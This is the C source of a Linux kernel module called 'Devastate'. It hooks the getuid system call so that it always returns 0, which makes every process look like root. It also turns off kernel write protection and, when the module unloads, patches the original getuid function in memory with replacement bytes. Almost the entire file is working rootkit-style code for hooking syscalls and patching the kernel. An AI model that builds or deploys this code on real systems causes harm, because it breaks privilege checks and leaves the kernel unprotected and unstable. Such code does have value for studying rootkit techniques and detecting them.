#include <linux/init.h>
#include <linux/module.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>

unsigned long *_sys_call_table;
char *(*_kallsyms_lookup)(unsigned long, unsigned long *, unsigned long *, char **, char*);

// replaced system calls
int (*orig_getuid)(void);

int new_getuid(void)
{
	return 0;
}

int our_asm_len = 16;
unsigned char our_asm[] = {
	0x66, 0x66, 0x66, 0x66, 0x90,
	0x55,			// push %rbp
	0x31, 0xc0,		// xor %eax,%eax
	0x48, 0x89, 0xe5,	// mov %rsp,%rbp
	0x5d,			// pop %rbp
	0xc3,			// retq
	0x0f, 0x1f, 0x00	// nopl
};

void devastate(unsigned long addr)
{
	unsigned long symbolsize, offset;
	char *modname, namebuf[64];

	int i;
	unsigned char *b;
	unsigned long cr0;

	(*_kallsyms_lookup)(addr, &symbolsize, &offset, &modname, namebuf);

	printk("Devastate: lookup results - a %lu s %lu o %lu n %s\n",
		addr, symbolsize, offset, namebuf);

	addr -= offset;

	cr0 = read_cr0();
	write_cr0(cr0 & ~0x00010000);
	for (i = 0; i < symbolsize; i++) {
		b = (unsigned char *) addr + i;
		printk("Devastate: dump %d - %02x\n", i, (unsigned char) *b);
		if (i < our_asm_len)
			*b = our_asm[i];
		else
			// touching more memory than we need may throw a nasty segfault and hang a module
			// which results in "general protection fault" log and a stacktrace in dmesg
			break;
	}
	printk("Devastate: function devastated!! }:> \n");
	// we could restore the register state, but do we really care?
	//write_cr0(cr0);
}

static int _mod_init(void)
{
	_sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
	_kallsyms_lookup = 
		(char *(*)(unsigned long, unsigned long *, unsigned long *, char **, char*))
		kallsyms_lookup_name("kallsyms_lookup");

	orig_getuid = (int (*)(void)) _sys_call_table[__NR_getuid];

	write_cr0(read_cr0() & ~0x00010000);
	_sys_call_table[__NR_getuid] = (unsigned long) new_getuid;

	printk("Devastate: Hello!\n");

	return 0;
}

static void _mod_exit(void)
{
	devastate((unsigned long) *orig_getuid);

	write_cr0(read_cr0() & ~0x00010000);
	_sys_call_table[__NR_getuid] = (unsigned long) orig_getuid;

	printk("Devastate: Goodbye!\n");
}

module_init(_mod_init);
module_exit(_mod_exit);

MODULE_LICENSE("GPL");
